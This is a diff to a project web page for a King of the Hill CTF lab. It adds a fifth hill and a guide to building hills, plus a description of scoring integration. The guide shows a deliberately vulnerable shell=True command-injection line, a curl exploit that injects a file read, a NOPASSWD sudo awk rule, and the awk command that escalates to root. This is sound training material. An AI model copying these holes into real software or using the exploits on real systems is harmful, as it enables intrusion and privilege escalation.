@@ -99,6 +99,7 @@ footer .mono{font-family:var(--mono);letter-spacing:1px}
  <div class="cta">
   <a class="btn" href="https://github.com/JJuly02/king-of-the-hill-ctf">View on GitHub</a>
   <a class="btn ghost" href="#quickstart">Quick start</a>
+  <a class="btn ghost" href="#addhill">Build a hill</a>
  </div>
  <div class="badges">
   <span class="badge">Pure Python stdlib</span>
@@ -125,9 +126,11 @@ footer .mono{font-family:var(--mono);letter-spacing:1px}
 </section>
 
 <section id="hills">
- <h2>The four hills</h2>
+ <h2>The hills</h2>
  <p class="sub">Each hill is a self-contained vulnerable box: a foothold vulnerability, then a
- local privilege escalation to root. Every one is verified end to end by the smoke test.</p>
+ local privilege escalation to root. Every one is verified end to end by the smoke test.
+ Four ship as the core set; a fifth, HackWars, is the worked example from
+ <a href="#addhill">Add your own hill</a>.</p>
  <div class="grid g2">
   <div class="card">
    <div class="k">Hill 1 // NetOps Console</div>
@@ -153,6 +156,12 @@ footer .mono{font-family:var(--mono);letter-spacing:1px}
    <p>A CI script console is unlinked from the UI and behind weak HTTP auth. Find it, authenticate, run code.</p>
    <div class="meta"><span class="pill a">foothold: weak creds</span><span class="pill">privesc: sudo tar</span></div>
   </div>
+  <div class="card">
+   <div class="k">Hill 5 // HackWars Arena</div>
+   <h3>Command injection (example)</h3>
+   <p>A match-telemetry console passes a relay host straight into a shell. The worked example built in <a href="#addhill">Add your own hill</a>.</p>
+   <div class="meta"><span class="pill a">foothold: cmd injection</span><span class="pill">privesc: sudo awk</span></div>
+  </div>
  </div>
 </section>
 
@@ -174,6 +183,121 @@ python3 scoreboard.py
 <span class="a">http://localhost:8000/admin</span>   <span class="c"># green-team control (pause, rotate, revert, adjust)</span></pre>
  <p class="sub" style="margin-top:20px">Want a scripted demo without deploying anything? <code>python3 poc/simulate.py</code> runs the
  scoring scenarios end to end. To verify the challenges, <code>bash deploy/smoke-test.sh</code>.</p>
+</section>
+
+<section id="addhill">
+ <h2>Add your own hill</h2>
+ <p class="sub">A hill is a directory under <code>deploy/hills/</code> plus two small config entries. As long
+ as it honours the contract below, the agent, scoreboard, tick engine and smoke test pick it up with no
+ code changes. The rest of this section builds <b>HackWars Arena</b> (hill-5) end to end as the worked
+ example.</p>
+
+ <h3>The contract</h3>
+ <div class="grid g2">
+  <div class="feat"><span class="dot"></span><div><h4>A foothold to an unprivileged user</h4><p>A vulnerable service running as a normal user (not root). Rooting it from the network lands you as that user, who can read <code>user.txt</code>.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>A planned privesc to root</h4><p>A deliberate local escalation (a sudo GTFOBins rule, a SUID binary, a writable root cron) that leads to <code>root.txt</code>.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>The king.txt convention</h4><p><code>/root/king.txt</code>, owner <code>root:root</code>, mode <code>600</code>, empty at start. Taking the hill means writing your team token there, which needs root.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>A reset that revives the vuln</h4><p><code>reset.sh</code> restores the entry vuln and the privesc path but never touches <code>king.txt</code>, so a box cannot be patched permanently shut.</p></div></div>
+ </div>
+
+ <h3>Files</h3>
+ <p class="sub">One directory, the same shape as the shipped hills:</p>
+<pre>deploy/hills/hill-5-hackwars/
+  Dockerfile          <span class="c"># base image + the service user (arena)</span>
+  docker-compose.yml  <span class="c"># local demo: publish the service on 8085</span>
+  entrypoint.sh       <span class="c"># plant flags + king.txt, install the privesc, run the service</span>
+  server.py           <span class="c"># the vulnerable service (foothold)</span>
+  sudoers.golden      <span class="c"># the planned privesc rule (restored by reset.sh)</span>
+  reset.sh            <span class="c"># revive vuln + privesc, never touch king.txt</span>
+  README.md           <span class="c"># what it is, the intended path</span></pre>
+
+ <h3>1. The foothold (server.py)</h3>
+ <p class="sub">HackWars is a match-telemetry console. Its "replay relay check" passes a host straight into a
+ shell, so anything after it runs as <code>arena</code>. That is the entire foothold.</p>
+<pre>match = q.get("match", ["relay-01"])[0]
+out = subprocess.run(f"ping -c 1 -W 1 {match}", shell=True, capture_output=True, text=True)  <span class="c"># command injection</span>
+self._send(200, out.stdout + out.stderr)</pre>
+<pre><span class="c"># foothold + user flag</span>
+curl -sG <span class="a">http://HILL:8085/replay</span> --data-urlencode 'match=x; cat /home/arena/user.txt'</pre>
+
+ <h3>2. The privesc (sudoers.golden)</h3>
+ <p class="sub">A single sudo rule lets <code>arena</code> run <code>awk</code> as root with no password. awk can spawn a
+ shell, so that is a direct GTFOBins path to root and to <code>root.txt</code>.</p>
+<pre><span class="c"># sudoers.golden</span>
+arena ALL=(root) NOPASSWD: /usr/bin/awk
+
+<span class="c"># from the foothold, escalate and read the root flag</span>
+sudo awk 'BEGIN{system("cat /root/root.txt")}'</pre>
+
+ <h3>3. Plant flags and king.txt (entrypoint.sh)</h3>
+ <p class="sub">The entrypoint plants both flags, creates an empty root-only <code>king.txt</code>, installs the
+ sudo rule from a golden copy, then drops to the service user.</p>
+<pre>echo 'CTF{h4ckw4rs_c0mm4nd_1nj3ct10n_f00th0ld}' &gt; /home/arena/user.txt
+echo 'CTF{h4ckw4rs_sud0_awk_gtf0b1ns_r00t}'     &gt; /root/root.txt
+: &gt; /root/king.txt; chmod 600 /root/king.txt          <span class="c"># root:root, empty = no owner yet</span>
+cp /opt/app/sudoers.golden /etc/sudoers.d/arena       <span class="c"># the planned privesc</span>
+exec su arena -c "python3 /opt/app/server.py"         <span class="c"># service runs unprivileged</span></pre>
+
+ <h3>4. Register it (two config entries)</h3>
+ <p class="sub">Tell the scoreboard the hill exists, and give it flags. Ids just have to be unique.</p>
+<pre><span class="c"># config/hills.json</span>
+{"id":"hill-5","name":"HackWars Arena","service_host":"127.0.0.1","service_port":8085,"hmac_key":"changeme-hill-5","url":"http://localhost:8085"}
+
+<span class="c"># flags/flags.json</span>
+{"flag_id":"hill-5-user","hill_id":"hill-5","kind":"user","flag":"CTF{h4ckw4rs_c0mm4nd_1nj3ct10n_f00th0ld}"}
+{"flag_id":"hill-5-root","hill_id":"hill-5","kind":"root","flag":"CTF{h4ckw4rs_sud0_awk_gtf0b1ns_r00t}"}</pre>
+
+ <h3>5. Take the hill, then verify</h3>
+<pre><span class="c"># take it: write your team token to king.txt (needs root)</span>
+sudo awk 'BEGIN{system("echo TOK-YOURTEAM &gt; /root/king.txt")}'
+
+<span class="c"># bring it up with the others and run the smoke test (chain + reset)</span>
+cd deploy/hills/hill-5-hackwars &amp;&amp; docker compose up -d --build
+bash deploy/smoke-test.sh</pre>
+ <div class="note"><p>The service runs as <code>arena</code>, never root, and <code>king.txt</code> is read by the
+ beacon agent from <b>outside</b> the box. So a team that fully roots the hill still cannot read the agent
+ key or forge an ownership report. That is the whole anti-cheat idea, and every new hill inherits it for free.</p></div>
+</section>
+
+<section id="integration">
+ <h2>How the integration works</h2>
+ <p class="sub">Two layers plug together. Inside KOTH, agents and the scoreboard decide who holds each hill.
+ Outside, an optional bridge feeds that into the RedutaCTF platform so a King of the Hill game can score
+ alongside jeopardy challenges on one scoreboard.</p>
+
+ <h3>Layer 1: KOTH's own scoring loop</h3>
+ <div class="grid g3">
+  <div class="feat"><span class="dot"></span><div><h4>Beacon agent</h4><p>Runs on the <b>host</b>, reads the hill's <code>king.txt</code> (via <code>docker exec</code> or a no-follow open), validates the token, and HMAC-signs a report with a per-hill key and a nonce.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>Collector + tick engine</h4><p>The scoreboard verifies the signature, rejects replays and symlink swaps, and every few seconds awards the current holder of each hill a tick, plus flag points and first bloods.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>SLA prober + green team</h4><p>An out-of-band prober checks each service is still up (defending by breaking it costs points), and a green-team panel can pause, rotate keys, revert, or adjust.</p></div></div>
+ </div>
+ <p class="sub">Because the signing key lives on the host and the token is validated by exact match, rooting a
+ hill does not let a team forge ownership. Keys rotate from the green-team panel on suspicion of a leak.</p>
+
+ <h3>Layer 2: bridge into the RedutaCTF platform</h3>
+ <p class="sub">RedutaCTF treats King of the Hill as an out-of-process plugin: a small HTTP service that the core
+ talks to over signed webhooks and a token-scoped awards API. The reference <code>koth-plugin</code> that
+ ships with RedutaCTF is the bridge.</p>
+ <ol>
+  <li>The core sends the plugin a signed webhook on every minute tick. The plugin verifies it: an HMAC-SHA256 over <code>timestamp + "." + body</code> in <code>X-Reduta-Signature</code>, with <code>X-Reduta-Delivery</code> for idempotency.</li>
+  <li>On <code>tick.minute</code> the plugin looks up who currently holds each target (from KOTH's scoreboard state) and posts an award to the core.</li>
+  <li>The award is idempotent by <code>ref_id</code>, so a redelivered tick never double counts.</li>
+ </ol>
+<pre><span class="c"># the plugin awards the current holder, once per tick per target</span>
+POST <span class="a">http://core:8080/api/v1/plugin/v1/awards</span>
+Authorization: Bearer plg_...
+{"event_id":"...","team_id":"&lt;current holder&gt;","points":5,
+ "ref_id":"tick:2026-09-02T10:00:00Z:hill-5","reason":"KotH tick hill-5"}</pre>
+ <p class="sub">The bridge is configured with environment variables, and the only KOTH-specific part is mapping a
+ KOTH team to a RedutaCTF team and reading the current holder from the KOTH scoreboard:</p>
+<pre>KOTH_WEBHOOK_SECRET   <span class="c"># shared secret for verifying core webhooks</span>
+KOTH_CORE_URL         <span class="c"># RedutaCTF core, e.g. http://server:8080</span>
+KOTH_PLUGIN_TOKEN     <span class="c"># plg_... token issued when the plugin is registered</span>
+KOTH_EVENT_ID         <span class="c"># the RedutaCTF event this game scores into</span>
+KOTH_TARGET           <span class="c"># which hill/target this bridge scores</span></pre>
+ <p class="sub">Verify a bridge before an event with <code>reduta plugin verify</code>, which checks it accepts signed
+ webhooks, is idempotent on redelivery, and rejects bad signatures. The platform side of this contract is
+ documented in the <a href="https://jjuly02.github.io/reduta/#plugins">RedutaCTF wiki</a>.</p>
 </section>
 
 <section id="docs">
